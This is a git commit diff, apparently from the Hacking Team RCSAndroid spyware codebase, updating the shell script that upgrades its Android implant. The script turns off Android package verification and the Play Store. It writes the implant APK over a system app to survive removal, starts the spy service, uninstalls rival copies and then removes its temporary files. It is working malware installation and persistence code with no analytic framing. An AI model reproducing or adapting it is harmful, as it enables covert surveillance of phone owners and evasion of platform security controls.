e827032412c4b6f78d8d95aab4c92137a8d566b5
zad <e.placidi@hackingteam.com>
2015-01-26 18:03:32 +0100

    fixed upgrade problem on v2 with poor shell environment. Note: On v2 9.5.1 persistent installation will be traced as failed, but only at information level.

--- RCSAndroid/server/template/upgrade.sh
+++ RCSAndroid/server/template/upgrade.sh
@@ -8,25 +8,38 @@ settings put global package_verifier_enable 0
 pm disable com.android.vending
 sleep 1
 
+#check persistency
+for i in  `ls /system/app/StkDevice* 2>/dev/null`;
+do
+/system/bin/ddf blw
+cat  /data/local/tmp/adb-tmp.apk > /system/app/StkDevice.apk
+#rm /data/local/tmp/adb-tmp.apk
+/system/bin/ddf blr
+break
+done
+
+#install normally, if /data/local/tmp/adb-tmp.apk isn't present
+#normal install not required
+#for i in  `ls /data/local/tmp/adb-tmp.apk 2>/dev/null`;
+#do
 pm install -r -f /data/local/tmp/adb-tmp.apk
+#break
+#done
 sleep 2
 
-installed=$(pm list packages com.android.dvci)
-if [ ${#installed} -gt 0 ]; then
-	# correctly installed
-	am startservice com.android.dvci/.ServiceMain
-	am broadcast -a android.intent.action.USER_PRESENT
+# correctly installed
+am startservice com.android.dvci/.ServiceMain
+am broadcast -a android.intent.action.USER_PRESENT
 
-	for geb in $(ls /data/data/*/files/geb); do
-		init=${geb#/data/data/}
-	    package=${init%%/*}
+for geb in $(ls /data/data/*/files/geb); do
+	init=${geb#/data/data/}
+    package=${init%%/*}
 
-	    if [ "$package" != "com.android.dvci" ]; then
-		    pm disable $package
-		    pm uninstall $package
-		fi
-	done
-fi
+    if [ "$package" != "com.android.dvci" ]; then
+	    pm disable $package
+	    pm uninstall $package
+	fi
+done
 
 sleep 2
 settings put global package_verifier_enable 1
@@ -34,9 +47,3 @@ pm enable com.android.vending
 
 rm /data/local/tmp/adb-tmp.apk
 rm -r /sdcard/.lost.found
-
-
-
-
-
-
